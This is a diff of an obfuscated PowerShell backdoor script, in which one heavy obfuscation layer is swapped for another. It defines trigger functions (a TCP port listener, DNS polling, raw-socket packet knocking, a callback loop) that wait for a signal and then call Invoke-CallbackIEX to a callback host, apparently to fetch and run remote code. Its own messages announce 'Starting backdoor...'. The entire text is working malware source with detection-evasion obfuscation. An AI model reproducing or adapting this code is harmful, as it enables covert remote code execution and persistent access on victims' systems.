+	write-host "!!! THIS BACKDOOR REQUIRES FIREWALL EXCEPTION !!!"
+	write-host "Timeout: $Timeout"
+	write-host "Port: $Port"
+	write-host "Trigger: $Trigger"
+	write-host "Using IPv4 Address: $LocalIP"
+	write-host "CallbackIP: $CallbackIP"
+	write-host
+	write-host "Starting backdoor..."
 	try{
 		
 		
-		${iPe`ND`Po`int} = &("{1}{0}{2}" -f 'w-obj','ne','ect') ("{1}{5}{2}{0}{3}{4}{6}"-f 'net.i','sys','m.','pend','p','te','oint')([net.ipaddress]"$localIP",${pO`RT})
-		${LisTEN`Er} = &("{0}{1}{3}{2}"-f'new-o','b','t','jec') ("{4}{3}{1}{2}{0}{5}" -f 'ts.','Soc','ke','tem.Net.','Sys','TcpListener') ${IpE`N`DpoInt}
-		${lisT`En`Er}.("{0}{1}" -f'S','tart').Invoke()
+		${iPeNd`POi`Nt} = new-object ("{2}{1}{0}{5}{4}{3}" -f't.ip','m.ne','syste','t','in','endpo')([net.ipaddress]"$localIP",${P`Ort})
+		${li`sTE`NEr} = new-object ("{0}{2}{7}{4}{6}{8}{1}{5}{3}" -f 'Sys','n','tem.','r','ock','e','ets.TcpLi','Net.S','ste') ${i`p`En`DPoinT}
+		${L`Isten`er}."St`Art"()
 		
 		
-		${R`unnI`Ng}=${TR`uE}
-		${M`ATCh} =""
-		${S`TarT`TIme} = &("{2}{1}{0}"-f '-date','et','g')
-		while(${r`unni`NG})
+		${RU`N`NinG}=${tr`Ue}
+		${M`AtCH} =""
+		${sta`R`TTi`ME} = get-date
+		while(${RU`Nn`inG})
 		{			
 			
-			if (${t`Imeo`uT} -ne 0 -and ($(  ${c`qM}::"N`Ow") -gt ${S`Ta`RTtIme}.("{1}{0}{2}" -f 'se','add','conds').Invoke(${TiM`EO`ut})))  
+			if (${T`IMEO`ut} -ne 0 -and ($( ( Gi  ("{2}{0}{3}{1}"-f 'RiaBlE','5NR','VA',':I6S')  ).VALue::"N`ow") -gt ${St`AR`TTIME}."Ad`d`sECoNds"(${Ti`M`eOuT})))  
 			{
-				${RUNN`i`Ng}=${FAL`sE}
+				${Ru`NN`inG}=${Fa`L`se}
 			}
 			
 			
-			if(${liSte`Ner}.("{1}{0}"-f'ing','Pend').Invoke())
+			if(${l`ISTE`NER}."Pe`Nd`Ing"())
 			{
 				
-				${cL`iENt} = ${liST`E`NEr}.("{1}{0}{4}{2}{3}" -f 'cce','A','cpCli','ent','ptT').Invoke()
-				&("{0}{2}{1}"-f 'wri','e-host','t') ("{0}{2}{1}{3}"-f 'Cl','Connec','ient ','ted!')
-				${STRE`AM} = ${C`L`Ient}.("{1}{0}{2}"-f'rea','GetSt','m').Invoke()
-				${RE`AD`er} = &("{2}{0}{3}{1}" -f'j','t','new-ob','ec') ("{2}{1}{3}{0}"-f'eader','tem.IO','Sys','.StreamR') ${sTre`Am}
+				${cL`I`EnT} = ${liSt`EN`Er}."accE`PTtcp`cl`IE`Nt"()
+				write-host "Client Connected!"
+				${S`TR`eam} = ${cl`IENT}."Ge`Tst`REAm"()
+				${REAd`ER} = new-object ("{3}{0}{4}{2}{1}" -f 'IO.','eader','reamR','System.','St') ${st`REAm}
 				
 				
-				${l`ine} = ${re`AdEr}.("{0}{1}"-f 'ReadLin','e').Invoke()
+				${Li`NE} = ${RE`AD`Er}."reA`D`Line"()
 				
 				
-				if (${li`NE} -eq ${TRi`Gg`Er})
+				if (${LI`Ne} -eq ${tRIG`G`Er})
 				{
-					${r`un`NInG}=${Fal`Se}
-					${MaT`Ch} = ([system.net.ipendpoint] ${C`LiE`NT}."CLi`e`Nt"."Rem`OTE`End`p`OiNt")."ADDr`ess".("{0}{1}"-f'T','oString').Invoke()
-					&("{0}{1}{2}"-f 'wri','te-h','ost') ('MATCH'+':'+' '+"$match")
+					${ru`Nni`Ng}=${FA`lSE}
+					${M`AT`CH} = ([system.net.ipendpoint] ${C`LI`enT}."cL`ieNt"."rEmotE`enDP`O`i`Nt")."aDD`R`ESS"."tOsTr`ING"()
+					write-host "MATCH: $match"
 				}
 				
 				
-				${r`eADER}.("{0}{1}"-f 'Di','spose').Invoke()
-				${s`T`REAM}.("{1}{0}" -f'e','Dispos').Invoke()
-				${CLiE`Nt}.("{1}{0}" -f 'se','Clo').Invoke()
-				&("{1}{2}{0}{3}" -f'-hos','writ','e','t') ("{2}{1}{3}{0}"-f'cted',' Disco','Client','nne')
+				${reaD`eR}."dI`SpoSe"()
+				${ST`R`eAM}."dISPO`SE"()
+				${cli`E`NT}."c`LosE"()
+				write-host "Client Disconnected"
 			}
 		}
 		
 		
-		&("{0}{1}{2}" -f 'w','rite-ho','st') ("{2}{0}{1}" -f 'ng ','Socket','Stoppi')
-		${l`is`TEneR}.("{0}{1}"-f 'St','op').Invoke()
-		if(${mA`Tch})
+		write-host "Stopping Socket"
+		${l`ISTenEr}."s`TOp"()
+		if(${mA`TCh})
 		{
-			if(${c`AllB`A`ckiP})
+			if(${CA`lLb`A`Ckip})
 			{
-				${sUCcE`Ss} = &("{1}{4}{2}{0}{3}" -f 'IE','Invoke-Call','ack','X','b') ${cAlL`BACk`Ip}
+				${Suc`CesS} = Invoke-CallbackIEX ${c`AlLbA`cKIp}
 			}
 			else
 			{
-				${s`UcceSs} = &("{2}{0}{1}{4}{3}"-f'ke','-Callb','Invo','ckIEX','a') ${M`AtcH}
+				${SuC`cE`Ss} = Invoke-CallbackIEX ${MAt`Ch}
 			}
 		}
 	}
 	catch [System.Net.Sockets.SocketException] {
-		&("{3}{0}{2}{1}" -f'rite','t','-hos','w') ("{2}{0}{5}{1}{4}{3}"-f'r:','cke','Erro','r','t Erro',' So') -fore ("{1}{0}"-f'd','re')
+		write-host "Error: Socket Error" -fore ("{0}{1}"-f're','d')
 	}
 }
 
-function I`Nvok`e-`Dn`SlOOP
+function InVo`kE`-`DNsL`OOp
 {
 
 	param(
-		[Parameter(MAndaTory=${F`AlSe},PosITIOn=1)]
-		[string]${CA`l`lB`AcKIP},
-		[Parameter(mandaTory=${f`AlsE},PoSITION=2)]
-		[string]${hoS`TN`AmE}=("{0}{3}{2}{1}{4}"-f 'yay.','dub.n','x','si','et'),
-		[Parameter(MandAtoRy=${Fal`sE},POsItIoN=3)]
-		[string]${Tri`GG`er}=("{0}{1}{2}"-f '127','.0','.0.1'),
-		[Parameter(MaNdaToRY=${F`AlSe},POSitIOn=4)]
-		[int] ${TI`MEOUT}=0,
-		[Parameter(maNDatOry=${Fal`SE},poSITioN=5)]
-		[int] ${sLE`Ep}=1
+		[Parameter(mAndATOry=${FA`lse},pOsiTIOn=1)]
+		[string]${C`AllBack`IP},
+		[Parameter(MandATOrY=${fa`l`se},POsitioN=2)]
+		[string]${HO`S`TnaMe}="yay.sixdub.net",
+		[Parameter(MaNDaTOry=${fA`lSe},POsitiOn=3)]
+		[string]${TrIg`G`ER}="127.0.0.1",
+		[Parameter(MaNDaToRY=${F`Al`se},PoSItIOn=4)]
+		[int] ${TIme`O`Ut}=0,
+		[Parameter(mAnDAtory=${Fa`l`SE},PoSItioN=5)]
+		[int] ${sLe`Ep}=1
 	)
 	
 	
-	&("{1}{0}{2}"-f'os','write-h','t') ('Timeou'+'t'+': '+"$Timeout")
-	&("{0}{1}{2}" -f 'write-','ho','st') ('S'+'leep '+'T'+'ime: '+"$Sleep")
-	&("{1}{0}{2}"-f 't','wri','e-host') ('T'+'r'+'igger: '+"$Trigger")
-	&("{0}{2}{1}" -f'w','ite-host','r') ('Usi'+'ng'+' '+'Hostn'+'am'+'e:'+' '+"$Hostname")
-	&("{1}{0}{2}" -f 'rite-ho','w','st') ('Cal'+'lbackIP'+': '+"$CallbackIP")
-	&("{1}{2}{0}"-f'st','writ','e-ho')
-	&("{2}{1}{0}" -f 'e-host','it','wr') ("{2}{3}{1}{4}{0}"-f'...',' back','St','arting','door')
+	write-host "Timeout: $Timeout"
+	write-host "Sleep Time: $Sleep"
+	write-host "Trigger: $Trigger"
+	write-host "Using Hostname: $Hostname"
+	write-host "CallbackIP: $CallbackIP"
+	write-host
+	write-host "Starting backdoor..."
 	
 	
-	${rUN`N`ing}=${t`RUe}
-	${MAt`ch} =""
-	${STA`R`Tti`me} = &("{1}{0}" -f 'e','get-dat')
-	while(${R`U`NNINg})
+	${r`UN`NinG}=${tr`ue}
+	${mat`cH} =""
+	${Sta`RTt`ime} = get-date
+	while(${RUn`NIng})
 	{
 		
-		if (${tImE`OuT} -ne 0 -and ($( ${C`qm}::"n`ow") -gt ${S`TarT`Ti`ME}.("{1}{2}{3}{0}" -f'nds','a','dd','seco').Invoke(${Ti`meO`Ut})))  
+		if (${Tim`EouT} -ne 0 -and ($(  ( gET-vARIAble  ("I6s5"+"Nr")  ).value::"N`Ow") -gt ${Sta`R`TtiME}."aDDSec`O`Nds"(${TIM`eO`Ut})))  
 		{
-			${rU`N`NiNG}=${fA`L`Se}
+			${R`uN`NInG}=${Fa`L`sE}
 		}
 		
 		try {
 			
-			${I`Ps} =   ( &("{0}{1}"-f'VAR','IaBLe') ('E'+'XkW')  )."Val`Ue"::("{2}{1}{4}{3}{0}"-f 'ddresses','tH','Ge','A','ost').Invoke(${h`OsTnamE})
-			foreach (${Ad`DR} in ${i`ps})
+			${I`pS} =  (  Get-VArIABle ("{1}{0}"-f 'RIxE','t') -vA)::"gEtH`OsTaD`DrEsS`Es"(${HO`stN`A`ME})
+			foreach (${ad`Dr} in ${I`Ps})
 			{
 				
 				
-				${R`esOL`Ved}=${ad`Dr}."ipAddrE`Ss`TO`sTR`INg"
-				if(${r`eSo`LV`eD} -ne ${tr`Ig`ger})
+				${r`Es`OL`Ved}=${a`DDR}."IpADdrESsT`Os`T`RING"
+				if(${reS`OL`VEd} -ne ${tR`I`Gger})
 				{
-					${Runn`iNg}=${Fa`l`SE}
-					${m`At`CH}=${RES`O`Lved}
-					&("{1}{2}{0}"-f 't','wr','ite-hos') ('Mat'+'ch: '+"$match")
+					${RuN`NIng}=${F`AL`Se}
+					${mA`TcH}=${re`SOLv`Ed}
+					write-host "Match: $match"
 				}
 				
 			}
@@ -397,187 +397,187 @@ function I`Nvok`e-`Dn`SlOOP
 			
 		}
 
-		&("{1}{0}"-f 'eep','sl') -s ${slE`Ep}
+		sleep -s ${s`L`eEp}
 	}
-	&("{0}{1}{2}{3}"-f 'writ','e-ho','s','t') ("{0}{6}{3}{4}{2}{1}{5}" -f'Shutting do','Check..','S ','D','N','.','wn ')
-	if(${MaT`cH})
+	write-host "Shutting down DNS Check..."
+	if(${ma`Tch})
 	{
-		if(${CAL`LbaC`k`ip})
+		if(${CAlLbAc`K`IP})
 		{
-			${S`UCC`eSs} = &("{2}{0}{3}{1}{5}{4}"-f 'k','-C','Invo','e','IEX','allback') ${c`AL`lbACKIp}
+			${su`cce`ss} = Invoke-CallbackIEX ${cA`lLBack`ip}
 		}
 		else
 		{
-			${s`uC`CesS} = &("{0}{4}{5}{1}{2}{3}"-f'I','l','backI','EX','nvo','ke-Cal') ${mA`T`ch}
+			${su`ccE`sS} = Invoke-CallbackIEX ${m`ATch}
 		}
 	}
 }
 
-function INvoke-`p`ACKe`TKNock
+function inVok`e-P`ACKe`TkNOcK
 {	
 
 	param(
-	[Parameter(mandaTORy=${f`AL`SE},POSItiON=1)]
-	[string]${C`ALLBa`ckIp},
-	[Parameter(mANdatOry=${FAL`Se},pOsiTiOn=2)]
-	[string]${LOc`ALIP}, 
-	[Parameter(MaNdatory=${Fa`lSE},POsITiON=3)]
-	[string]${T`RiGgER}=("{0}{2}{1}"-f'Q','X123','AZWS'), 
-	[Parameter(maNDAtory=${F`A`LSe},POsITION=4)]
-	[int]${T`imeOuT}=0
+	[Parameter(MANdaTorY=${faL`sE},pOsitIoN=1)]
+	[string]${CaLL`B`Ack`iP},
+	[Parameter(MANdatoRy=${f`Alse},POSiTion=2)]
+	[string]${lo`cAL`iP}, 
+	[Parameter(maNdatOrY=${f`AlSE},PoSiTIOn=3)]
+	[string]${tRIgG`eR}="QAZWSX123", 
+	[Parameter(mAndaTORY=${fal`SE},pOsITIon=4)]
+	[int]${tI`Me`OUt}=0
 	)
-	If (-NOT ([Security.Principal.WindowsPrincipal]  (  &("{2}{1}{0}" -f'aBle','ARI','V') ("{1}{0}" -f'Jfh','d8'))."Va`LUE"::("{1}{0}{2}"-f 'e','GetCurr','nt').Invoke())."IsI`NRoLe"([Security.Principal.WindowsBuiltInRole] ("{2}{3}{0}{1}"-f'trato','r','Admin','is')))
+	If (-NOT ([Security.Principal.WindowsPrincipal]   ( get-VARIABle  ("Zn"+"u")  -vaLueONLy)::"GE`TCuRr`e`NT"())."i`sIn`RoLe"([Security.Principal.WindowsBuiltInRole] "Administrator"))
 	{
-		&("{1}{0}{2}" -f 'os','Write-H','t') ("{7}{3}{0}{2}{10}{1}{4}{9}{6}{11}{12}{8}{5}" -f'kdo','ui','or r',' bac','res Admi','! ','... ge','This','k','n :(','eq','t to ','wor')
+		Write-Host "This backdoor requires Admin :(... get to work! "
 		Return
 	}
 	
-	if (-not ${LOc`Al`IP}) 
+	if (-not ${lo`caLIP}) 
 	{
-		&("{1}{0}" -f'oute','r') ("{1}{0}" -f 't','prin') ('0*') | &('%') { 
+		route ("{1}{0}" -f'int','pr') ('0*') | % { 
 			if (${_} -match "\s{2,}0\.0\.0\.0") { 
-				${N`uLl},${nu`LL},${n`UlL},${l`Ocal`iP},${n`ULL} =  ${eI`jS}::("{0}{1}{2}"-f'repla','c','e').Invoke(${_}.("{0}{1}" -f't','rimstart').Invoke(" "),"\s{2,}",",").("{1}{0}"-f 'it','spl').Invoke(",")
+				${nU`lL},${n`ULL},${nu`Ll},${L`oC`AliP},${n`ull} =  (  lS ("vaRIaBlE"+":Q8WgP"+"C")  ).vALue::"re`P`lACE"(${_}."T`Ri`mStArT"(" "),"\s{2,}",",")."SP`lIt"(",")
 				}
 			}
 	}
 	
 	
-	&("{2}{0}{1}"-f'e-hos','t','writ') ("{5}{4}{2}{1}{9}{10}{7}{8}{6}{3}{11}{0}" -f'ON !!!',' ','ACKDOOR','L EXC','S B','!!! THI','IREWAL','S ','F','REQUI','RE','EPTI')
-	&("{2}{1}{0}" -f'host','te-','wri') ('Time'+'ou'+'t: '+"$Timeout")
-	&("{2}{3}{0}{1}" -f 'os','t','writ','e-h') ('Trig'+'ger'+': '+"$Trigger")
-	&("{1}{0}{2}" -f 'te-','wri','host') ('U'+'s'+'ing '+'IPv'+'4 '+'Ad'+'dre'+'ss: '+"$LocalIP")
-	&("{2}{0}{1}"-f'te-ho','st','wri') ('Ca'+'l'+'l'+'backIP: '+"$CallbackIP")
-	&("{0}{1}{3}{2}" -f 'write-','h','st','o')
-	&("{1}{3}{0}{2}"-f'h','w','ost','rite-') ("{1}{0}{2}{3}"-f'rting','Sta',' backdoor.','..')
+	write-host "!!! THIS BACKDOOR REQUIRES FIREWALL EXCEPTION !!!"
+	write-host "Timeout: $Timeout"
+	write-host "Trigger: $Trigger"
+	write-host "Using IPv4 Address: $LocalIP"
+	write-host "CallbackIP: $CallbackIP"
+	write-host
+	write-host "Starting backdoor..."
 	
 	
-	${bYT`EIN} = &("{1}{0}{2}" -f 'obj','new-','ect') ("{0}{1}" -f'byte[',']') 4
-	${bY`Te`Out} = &("{2}{0}{1}" -f 'bj','ect','new-o') ("{1}{2}{0}"-f'e[]','by','t') 4
-	${B`yT`eDatA} = &("{2}{1}{0}" -f't','bjec','new-o') ("{0}{1}{2}"-f 'b','yte','[]') 4096  
+	${BY`TE`IN} = new-object ("{1}{0}" -f 'te[]','by') 4
+	${BY`TE`oUT} = new-object ("{2}{0}{1}" -f't','e[]','by') 4
+	${by`T`edata} = new-object ("{0}{1}" -f 'byte[',']') 4096  
 
-	${BYtE`iN}[0] = 1  
-	${bY`T`eIN}[1-3] = 0
-	${B`Yte`out}[0-3] = 0
+	${BYTE`iN}[0] = 1  
+	${b`YT`EIn}[1-3] = 0
+	${byT`eOut}[0-3] = 0
 	
 	
-	${sOC`Ket} = &("{2}{0}{1}{3}" -f 'w','-objec','ne','t') ("{1}{0}{6}{4}{2}{5}{3}" -f't','sys','ckets.sock','t','m.net.so','e','e')(  ${H`e8}::"i`NTErn`ET`wOrk",  ${RH2`iz}::"r`AW",  (&("{1}{2}{0}"-f 'iaBLe','v','Ar')  ('O'+'0F')  -vALuEo  )::"i`p")
-	${Soc`K`Et}.("{0}{2}{1}"-f'setsocketop','on','ti').Invoke("IP",("{0}{3}{2}{1}{4}"-f'H','clud','aderIn','e','ed'),${T`Rue})
-	${so`CK`Et}."recEivebufFE`R`S`IzE" = 819200
-
-	
-	${ip`endpOi`NT} = &("{2}{1}{0}"-f'object','w-','ne') ("{2}{0}{3}{4}{5}{1}" -f'e','point','syst','m','.','net.ipend')([net.ipaddress]"$localIP",0)
-	${SOc`KET}.("{1}{0}"-f'nd','bi').Invoke(${Ip`end`Point})
+	${s`OCket} = new-object ("{5}{3}{2}{6}{4}{0}{1}" -f 'kets','.socket','n','stem.','soc','sy','et.')(  (DIR  ("{2}{0}{3}{1}{4}"-f'lE:','fI','vaRIAb','L8','uY')).value::"iNte`R`Ne`TwoRk",  (GCi  ("{1}{0}{2}{3}"-f'aRIABLe:2','v','64p','VJ') ).ValUE::"r`AW",  $EaCs::"Ip")
+	${s`ocK`Et}."sEtSOc`ketopti`On"("IP","HeaderIncluded",${t`RUe})
+	${So`CK`eT}."re`ceIve`BufFEr`sIzE" = 819200
 
 	
-	[void]${S`Oc`kEt}.("{2}{0}{1}"-f'ntro','l','ioco').Invoke(  ( &("{2}{3}{1}{0}" -f 'M','HIldite','gEt-','c') ("vARi"+"ab"+"l"+"E:7NX2bS")  )."va`lue"::"recei`V`E`AlL",${B`YtE`in},${byt`e`OuT})
+	${i`pE`N`dpoint} = new-object ("{6}{2}{0}{5}{4}{1}{3}"-f'em.n','i','t','nt','ipendpo','et.','sys')([net.ipaddress]"$localIP",0)
+	${S`OCkEt}."b`inD"(${i`pendP`oI`NT})
 
 	
-	${sT`A`R`TTIME} = &("{1}{2}{0}"-f'ate','ge','t-d')
-	${RU`NNIng} = ${t`Rue}
-	${M`A`Tch} = ""
-	${PAcK`ets} = @()
-	while (${rUN`Ni`Ng})
+	[void]${s`Oc`kEt}."IocoNtr`ol"( $jmhB::"r`EceIV`eA`ll",${bYT`eiN},${B`yT`eoUt})
+
+	
+	${s`T`AR`TTiME} = get-date
+	${rUN`NiNG} = ${Tr`Ue}
+	${MAt`cH} = ""
+	${p`Ack`Ets} = @()
+	while (${r`UN`NiNg})
 	{
 		
-		if (${T`ImEo`ut} -ne 0 -and ($(  (  &("{0}{1}"-f 'gC','i') ('v'+'aRIABlE:'+'c'+'Qm')  )."v`ALUE"::"n`OW") -gt ${STa`Rt`TIMe}.("{1}{0}{2}" -f'second','add','s').Invoke(${T`iMEoUt})))  
+		if (${T`I`MeOut} -ne 0 -and ($( (GET-chIldiTEM  ("{3}{0}{4}{2}{1}"-f'arIABLe:','s5NR','6','V','i') ).vaLUe::"N`OW") -gt ${St`A`R`TtimE}."a`d`dsecONDS"(${tI`MeoUT})))  
 		{
-			${r`U`NnInG}=${F`A`LSE}
+			${RU`Nn`INg}=${f`ALSe}
 		}
 		
-		if (-not ${S`ockEt}."av`AiLAB`le")
+		if (-not ${S`oCkeT}."aV`AIlA`BLe")
 		{
-			&("{0}{1}{2}"-f 'star','t-','sleep') -milliseconds 500
+			start-sleep -milliseconds 500
 			continue
 		}
 		
 		
-		${R`CV} = ${S`OCKeT}.("{0}{2}{1}" -f'rec','e','eiv').Invoke(${b`Yt`EdatA},0,${B`Y`T`EDaTa}."lEn`GtH",  ${x`E3}::"nO`NE")
+		${R`cV} = ${s`Ock`ET}."rE`Ce`IVe"(${Byt`E`DATA},0,${BYTe`d`A`Ta}."lEN`GtH",  $y4HBR::"NO`NE")
 
 		
-		${mEMO`Rys`TR`E`Am} = &("{2}{0}{1}" -f'bjec','t','new-o') ("{3}{0}{4}{1}{2}"-f 'em.I','re','am','Syst','O.MemorySt')(${byT`e`DATA},0,${r`cv})
-		${BIN`ARY`R`eADEr} = &("{2}{1}{0}"-f't','ew-objec','n') ("{0}{2}{1}{3}" -f'Syste','O.B','m.I','inaryReader')(${mEMO`RyS`TReAM})
+		${meMOr`YS`Tr`eAm} = new-object ("{5}{6}{3}{1}{2}{0}{4}" -f 'mo','.M','e','O','ryStream','Syste','m.I')(${B`Y`TedatA},0,${r`cv})
+		${B`InArYRE`A`Der} = new-object ("{0}{4}{1}{3}{2}"-f 'Syst','.Bi','der','naryRea','em.IO')(${mEm`o`RYstREAM})
 		
 		
-		${trA`Sh}  = ${bIN`ARY`REad`ER}.("{0}{1}{3}{2}" -f 'Read','By','es','t').Invoke(12)
+		${T`RaSH}  = ${B`iN`A`RYrea`DER}."rE`A`DbytEs"(12)
 		
 		
-		${S`ourcE`iPaddrE`Ss} = ${bIn`AR`YR`EadER}.("{0}{1}{2}" -f'Read','U','Int32').Invoke()
-		${sOur`ce`i`padDrESS} = [System.Net.IPAddress]${SOu`R`cEIPAD`d`REss}
-		${D`E`StInAt`ioNIP`AddrE`sS} = ${bINA`R`YrEaDEr}.("{2}{0}{1}"-f 'U','Int32','Read').Invoke()
-		${D`e`STinaTionipAddR`ESs} = [System.Net.IPAddress]${d`Es`TInat`IO`NIPA`DdReSS}
-		${RE`mAiNd`e`RByTeS} = ${b`INARYRE`Ader}.("{0}{3}{2}{1}"-f 'R','s','adByte','e').Invoke(${ME`M`OrYStr`EAM}."le`NGtH")
+		${SO`Ur`Ceip`A`dDRess} = ${BInA`RYREa`DEr}."reA`DUin`T32"()
+		${sOU`Rc`Eip`AddrEsS} = [System.Net.IPAddress]${SO`U`RceiP`ADD`REss}
+		${Des`TinAtiOnIP`A`DD`RESs} = ${B`InaRYr`e`ADeR}."reAd`u`INt32"()
+		${d`ESt`i`NA`TioNIPAd`Dre`SS} = [System.Net.IPAddress]${de`s`T`INAtIONIpaddR`E`ss}
+		${REmai`NDerb`Y`Tes} = ${bIn`ArY`R`EAder}."R`EA`DbYTeS"(${me`M`OrysT`Re`AM}."l`En`gTH")
 		
 		
-		${AS`ci`iEn`COdING} = &("{2}{3}{0}{1}"-f'j','ect','n','ew-ob') ("{5}{3}{2}{4}{0}{1}"-f't.asciienc','oding','t','ys','em.tex','s')
-		${RE`mAIn`dErOf`PAc`KEt} = ${a`S`CiiENCODING}.("{0}{2}{1}"-f'G','tString','e').Invoke(${reMain`D`er`ByTeS})
+		${ASciie`N`CODIng} = new-object ("{3}{1}{4}{2}{0}" -f 'iiencoding','stem','xt.asc','sy','.te')
+		${reMaINd`E`ROfPAcK`et} = ${asc`Iienc`oDing}."g`ETS`TRINg"(${remai`Nder`B`Y`Tes})
 		
 		
-		${bIN`ARYre`AdER}.("{0}{1}" -f 'Clo','se').Invoke()
-		${MEmor`y`ST`ReAm}.("{1}{0}" -f 'se','Clo').Invoke()
+		${b`InarY`R`EaDEr}."c`loSe"()
+		${m`eM`OryStR`E`AM}."Cl`Ose"()
 		
 		
-		if (${R`eMainD`E`ROFp`AcKet} -match ${TR`IgGeR})
+		if (${R`EmA`IndER`OFPA`C`KEt} -match ${T`RiG`ger})
 		{
-			&("{1}{2}{0}" -f 'host','writ','e-') ("{1}{0}"-f 'atch: ','M') ${SOurceIpA`d`dre`ss}
-			${rUNni`Ng}=${F`A`lSE}
-			${m`AtcH} = ${SOu`RCE`IpAD`D`ResS}
+			write-host "Match: " ${SourCE`iPa`D`d`ReSS}
+			${r`uNNi`Ng}=${FAl`SE}
+			${MAt`ch} = ${S`ourCEIpaD`d`Re`sS}
 		}
 	}
 	
-	if(${m`AT`CH})
+	if(${MA`T`CH})
 	{
-		if(${CaLL`B`AcKiP})
+		if(${cAL`lB`AcK`ip})
 		{
-			${su`Cc`EsS} = &("{3}{2}{5}{0}{4}{1}"-f 'ck','X','l','Invoke-Cal','IE','ba') ${C`ALlba`c`kiP}
+			${S`uCC`EsS} = Invoke-CallbackIEX ${C`A`llbaCKIp}
 		}
 		else
 		{
-			${SUcCe`SS} = &("{1}{3}{5}{0}{2}{4}" -f'allba','Invo','ckI','k','EX','e-C') ${MAt`ch}
+			${sU`Cce`ss} = Invoke-CallbackIEX ${Ma`Tch}
 		}
 	}
 	
 }
 
-function iNV`OkE-`CaLLBAcklO`op
+function i`N`Vok`E-CalLb`AC`KLOop
 {
 
 	Param(  
-	[Parameter(MaNDaTorY=${TR`Ue},POSITION=1)]
-	[string]${ca`lLb`ACkiP},
-	[Parameter(MANdAtoRy=${f`A`lse},POsItioN=2)]
-	[int]${TIm`E`out}=0,
-	[Parameter(MAnDatORy=${F`Al`SE},poSitIon=3)]
-	[int] ${s`lEep}=1
+	[Parameter(MaNdATorY=${tR`uE},PoSitIoN=1)]
+	[string]${c`All`Ba`ckIP},
+	[Parameter(maNDatoRY=${f`AL`se},poSItION=2)]
+	[int]${tiME`O`ut}=0,
+	[Parameter(ManDATORy=${Fa`LSE},poSiTion=3)]
+	[int] ${Sle`Ep}=1
 	)
 	
 		
-	&("{0}{2}{1}"-f 'w','ost','rite-h') ('T'+'imeo'+'ut:'+' '+"$Timeout")
-	&("{0}{1}{3}{2}" -f 'w','ri','-host','te') ('Sleep'+': '+"$Sleep")
-	&("{1}{0}{2}"-f 'e','writ','-host') ('Call'+'backIP:'+' '+"$CallbackIP")
-	&("{2}{1}{0}"-f 'host','e-','writ')
-	&("{0}{2}{1}" -f 'w','t','rite-hos') ("{2}{0}{1}{3}"-f'ng back','d','Starti','oor...')
+	write-host "Timeout: $Timeout"
+	write-host "Sleep: $Sleep"
+	write-host "CallbackIP: $CallbackIP"
+	write-host
+	write-host "Starting backdoor..."
 	
 	
-	${rUN`N`Ing}=${t`RUE}
-	${m`At`ch} =""
-	${ST`AR`TTIME} = &("{1}{0}" -f 't-date','ge')
-	while(${Run`N`ing})
+	${Runn`I`NG}=${t`RuE}
+	${ma`T`ch} =""
+	${s`TART`TiMe} = get-date
+	while(${r`u`NNing})
 	{
 		
-		if (${TiME`o`uT} -ne 0 -and ($( (  &("{0}{2}{3}{1}" -f 'gE','E','t-vArIA','BL')  ('c'+'qm') -ValueoNlY  )::"N`OW") -gt ${s`TAr`TTIMe}.("{0}{2}{1}"-f'add','conds','se').Invoke(${T`i`MeOut})))  
+		if (${Ti`MeOuT} -ne 0 -and ($( ( gET-VARIAblE ("i6S"+"5nR") -vAlue)::"n`ow") -gt ${St`ArTTi`mE}."addS`e`conds"(${TI`mE`ouT})))  
 		{
-			${Ru`NnI`NG}=${fAL`Se}
+			${Ru`N`NiNg}=${F`Al`sE}
 		}
 		
-		${cheCks`uc`CESs} = &("{1}{2}{3}{0}{4}" -f'E','Invoke-Ca','llbac','kI','X') ${C`AL`lB`AcKIp} -Silent ${TR`uE}
+		${Ch`E`cksucce`ss} = Invoke-CallbackIEX ${C`ALLB`AcKiP} -Silent ${Tr`uE}
 		
-		if(${c`h`ECksU`CceSS} -eq 1)
+		if(${ch`e`ckS`UCc`ESs} -eq 1)
 		{
-			${rUNNI`NG}=${FA`LsE}
+			${R`unn`inG}=${fal`Se}
 		}
 		
-		&("{1}{0}" -f 'ep','sle') -s ${s`LeEp}
+		sleep -s ${s`l`EeP}
 	}
 	
-	&("{0}{2}{1}"-f 'wr','e-host','it') ("{0}{2}{1}{4}{3}"-f 'Sh','ing d','utt','r...','own backdoo')
+	write-host "Shutting down backdoor..."
 }
